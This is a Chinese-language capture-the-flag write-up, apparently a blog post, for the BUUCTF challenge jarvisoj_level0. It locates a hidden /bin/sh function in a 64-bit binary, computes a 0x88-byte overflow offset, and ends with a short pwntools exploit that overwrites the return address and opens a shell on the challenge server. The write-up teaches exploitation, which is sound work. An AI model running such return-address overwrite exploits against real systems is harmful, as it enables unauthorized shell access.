# BUUCTF-PWN-jarvisoj_level0

这道题也是栈溢出 但是有不同的函数

read()

write()

 [pwn常用函数_pwn write函数_「已注销」的博客-CSDN博客](https://blog.csdn.net/m0_49959202/article/details/120445700) 

先进行nc



<img src="https://i-blog.csdnimg.cn/blog_migrate/737d3c906c0a465956fb626b04ee1cd4.png" alt="" style="max-height:179px; box-sizing:content-box;" />


输出完就让我们输入

开始查信息



<img src="https://i-blog.csdnimg.cn/blog_migrate/aebbd92f9baaa3c3ca3e0aa023039797.png" alt="" style="max-height:251px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/c1efecdd5c6a426ce01cdf78524a95aa.png" alt="" style="max-height:249px; box-sizing:content-box;" />


发现是64

放入ida64 查字符串



<img src="https://i-blog.csdnimg.cn/blog_migrate/29aabefe034f3f7caebd0613ad0d481a.png" alt="" style="max-height:356px; box-sizing:content-box;" />


发现/bin/sh 漏洞代码

我们进去看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/33ca81a90e00b612514820a3076db6a7.png" alt="" style="max-height:279px; box-sizing:content-box;" />


先记住地址

```cobol
400596
```

进去发现果然没有使用这个函数

我们重新回到main函数



<img src="https://i-blog.csdnimg.cn/blog_migrate/6daec2b261629ab5bcfb2e429ffe5198.png" alt="" style="max-height:166px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/7a8a155df8b567777966b62ef81336f2.png" alt="" style="max-height:191px; box-sizing:content-box;" />


果然就是输出hello world 然后输入

这样我们就可以栈溢出

发现buf 占80字节 加上64基地址的8字节 我们就需要0x88个字节填充满

我们可以开始写exp

```cobol
from pwn import *
p=remote('node4.buuoj.cn',28671)
payload=b'A'*0x88+p64(0x400596)
p.sendline(payload)
p.interactive()
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/1cf6a579eb181a09a236b4c85c1674a3.png" alt="" style="max-height:409px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/f6005b4bb70c43f8c3bee8bfc7fa60ce.png" alt="" style="max-height:143px; box-sizing:content-box;" />